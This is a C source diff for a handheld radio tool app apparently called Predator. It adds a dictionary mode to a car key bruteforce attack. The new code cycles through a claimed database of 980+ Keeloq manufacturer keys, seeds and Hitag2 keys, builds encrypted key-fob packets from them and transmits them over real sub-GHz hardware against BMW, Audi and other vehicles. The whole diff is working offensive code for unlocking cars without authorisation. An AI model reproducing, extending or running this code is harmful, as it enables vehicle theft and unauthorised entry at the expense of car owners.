@@ -2,6 +2,7 @@
 #include "../helpers/predator_subghz.h"
 #include "../helpers/predator_logging.h"
 #include "../helpers/predator_crypto_engine.h"  // Real crypto algorithms
+#include "../helpers/predator_crypto_keys.h"    // 980+ KEY DATABASE
 #include "../helpers/predator_models.h"  // Car database with protocol detection
 #include <gui/view.h>
 #include <string.h>
@@ -31,6 +32,10 @@ typedef struct {
     Hitag2Context hitag2_ctx;  // ADDED: Hitag2 context for BMW/Audi
     SmartKeyContext smart_key_ctx;  // ADDED: Smart key context for AES-128 (Tesla, new BMW, Mercedes)
     bool is_smart_key_attack;  // ADDED: Flag for smart key mode
+    // 🔥 NEW: Dictionary attack with 980+ keys
+    bool use_dictionary;  // Use key database instead of bruteforce
+    uint32_t current_key_index;  // Current position in key array
+    uint32_t current_seed_index;  // Current position in seed array
 } CarKeyBruteforceState;
 
 static CarKeyBruteforceState carkey_state;
@@ -226,6 +231,26 @@ static bool car_key_bruteforce_ui_input_callback(InputEvent* event, void* contex
                                   protocol_name, app->selected_model_make, app->selected_model_name);
                         break;
                 }
+                
+                // 🔥 NEW: Enable dictionary mode for Keeloq/Hitag2
+                if(protocol == CryptoProtocolKeeloq) {
+                    carkey_state.use_dictionary = true;
+                    carkey_state.current_key_index = 0;
+                    carkey_state.current_seed_index = 0;
+                    carkey_state.total_codes = KEELOQ_KEY_COUNT * KEELOQ_SEED_COUNT; // Keys × Seeds
+                    predator_log_append(app, "🔥 DICTIONARY MODE: 480+ keys × 50+ seeds = 24,000+ combos");
+                    FURI_LOG_I("CarKeyBrute", "Dictionary: %d keys × %d seeds = %lu combos", 
+                              KEELOQ_KEY_COUNT, KEELOQ_SEED_COUNT, carkey_state.total_codes);
+                } else if(protocol == CryptoProtocolHitag2) {
+                    carkey_state.use_dictionary = true;
+                    carkey_state.current_key_index = 0;
+                    carkey_state.total_codes = HITAG2_KEY_COUNT;
+                    predator_log_append(app, "🔥 DICTIONARY MODE: 90+ Hitag2 keys loaded");
+                    FURI_LOG_I("CarKeyBrute", "Dictionary attack: %d Hitag2 keys", HITAG2_KEY_COUNT);
+                } else {
+                    carkey_state.use_dictionary = false;
+                }
+                
                 // Check if this is a smart key attack (Tesla, new BMW, Mercedes)
                 if(strstr(app->selected_model_make, "Tesla") ||
                    strstr(app->selected_model_make, "Model")) {
@@ -320,37 +345,86 @@ static void car_key_bruteforce_ui_timer_callback(void* context) {
                     }
                 }
             }
-            // Hitag2 for German cars (BMW/Audi)
+            // 🔥 HITAG2 for German cars (BMW/Audi)
             else if(strstr(app->selected_model_make, "BMW") || 
                strstr(app->selected_model_make, "Audi")) {
-                // Hitag2: Generate encrypted packet
-                carkey_state.hitag2_ctx.rolling_code++;
-                uint8_t packet[16];
-                size_t len = 0;
-                if(predator_crypto_hitag2_generate_packet(&carkey_state.hitag2_ctx, 0x01, packet, &len)) {
-                    // CRITICAL FIX: Actually transmit the packet via real hardware!
-                    predator_subghz_send_raw_packet(app, packet, len);
-                    app->packets_sent++;
-                    FURI_LOG_I("CarKeyBruteforce", "[REAL HW] Hitag2 packet %u TRANSMITTED", 
-                              carkey_state.hitag2_ctx.rolling_code);
+                // Use dictionary if enabled
+                if(carkey_state.use_dictionary && carkey_state.current_key_index < HITAG2_KEY_COUNT) {
+                    // Load key from dictionary (48-bit)
+                    memcpy(&carkey_state.hitag2_ctx.key_uid, HITAG2_KEYS[carkey_state.current_key_index], 6);
+                    
+                    uint8_t packet[16];
+                    size_t len = 0;
+                    if(predator_crypto_hitag2_generate_packet(&carkey_state.hitag2_ctx, 0x01, packet, &len)) {
+                        predator_subghz_send_raw_packet(app, packet, len);
+                        app->packets_sent++;
+                        FURI_LOG_I("CarKeyBruteforce", "[DICT] Hitag2 key %lu/%u TRANSMITTED", 
+                                  (unsigned long)carkey_state.current_key_index + 1, HITAG2_KEY_COUNT);
+                    }
+                    
+                    // Increment and update counter
+                    carkey_state.current_key_index++;
+                    carkey_state.codes_tried = carkey_state.current_key_index;
+                } else {
+                    // Normal rolling code increment (fallback or after dictionary)
+                    carkey_state.hitag2_ctx.rolling_code++;
+                    uint8_t packet[16];
+                    size_t len = 0;
+                    if(predator_crypto_hitag2_generate_packet(&carkey_state.hitag2_ctx, 0x01, packet, &len)) {
+                        predator_subghz_send_raw_packet(app, packet, len);
+                        app->packets_sent++;
+                        FURI_LOG_I("CarKeyBruteforce", "[REAL HW] Hitag2 packet %u TRANSMITTED", 
+                                  carkey_state.hitag2_ctx.rolling_code);
+                    }
                 }
             } else {
-                // Keeloq: Generate 528-round encrypted packet
-                carkey_state.keeloq_ctx.counter++;
-                uint8_t packet[16];
-                size_t len = 0;
-                if(predator_crypto_keeloq_generate_packet(&carkey_state.keeloq_ctx, packet, &len)) {
-                    // CRITICAL FIX: Actually transmit the packet via real hardware!
-                    predator_subghz_send_raw_packet(app, packet, len);
-                    app->packets_sent++;
-                    FURI_LOG_I("CarKeyBruteforce", "[REAL HW] Keeloq packet %u (528-round) TRANSMITTED", 
-                              carkey_state.keeloq_ctx.counter);
+                // 🔥 KEELOQ: Use dictionary or generate 528-round encrypted packet
+                if(carkey_state.use_dictionary && carkey_state.current_key_index < KEELOQ_KEY_COUNT) {
+                    // Use key from dictionary
+                    carkey_state.keeloq_ctx.manufacturer_key = KEELOQ_KEYS[carkey_state.current_key_index];
+                    
+                    // Try with current seed
+                    if(carkey_state.current_seed_index < KEELOQ_SEED_COUNT) {
+                        carkey_state.keeloq_ctx.counter = KEELOQ_SEEDS[carkey_state.current_seed_index];
+                    }
+                    
+                    uint8_t packet[16];
+                    size_t len = 0;
+                    if(predator_crypto_keeloq_generate_packet(&carkey_state.keeloq_ctx, packet, &len)) {
+                        predator_subghz_send_raw_packet(app, packet, len);
+                        app->packets_sent++;
+                        FURI_LOG_I("CarKeyBruteforce", "[DICT] Keeloq key %lu/%u seed %lu TRANSMITTED", 
+                                  (unsigned long)carkey_state.current_key_index, KEELOQ_KEY_COUNT, 
+                                  (unsigned long)carkey_state.current_seed_index);
+                    }
+                    
+                    // Move to next seed, or next key
+                    carkey_state.current_seed_index++;
+                    if(carkey_state.current_seed_index >= KEELOQ_SEED_COUNT) {
+                        carkey_state.current_seed_index = 0;
+                        carkey_state.current_key_index++;
+                    }
+                    // Update counter on EVERY iteration (key * seeds + current_seed)
+                    carkey_state.codes_tried = (carkey_state.current_key_index * KEELOQ_SEED_COUNT) + carkey_state.current_seed_index;
+                } else {
+                    // Normal counter increment
+                    carkey_state.keeloq_ctx.counter++;
+                    uint8_t packet[16];
+                    size_t len = 0;
+                    if(predator_crypto_keeloq_generate_packet(&carkey_state.keeloq_ctx, packet, &len)) {
+                        predator_subghz_send_raw_packet(app, packet, len);
+                        app->packets_sent++;
+                        FURI_LOG_I("CarKeyBruteforce", "[REAL HW] Keeloq packet %u (528-round) TRANSMITTED", 
+                                  carkey_state.keeloq_ctx.counter);
+                    }
                 }
             }
         }
         
-        // FIXED: Increment counter regardless of hardware state
-        carkey_state.codes_tried += 10; // Increment by 10 codes per 100ms tick
+        // FIXED: Increment counter (only if not using dictionary mode)
+        if(!carkey_state.use_dictionary) {
+            carkey_state.codes_tried += 10; // Increment by 10 codes per 100ms tick
+        }
         
         // Log progress every 100 codes
         if(carkey_state.codes_tried % 100 == 0) {
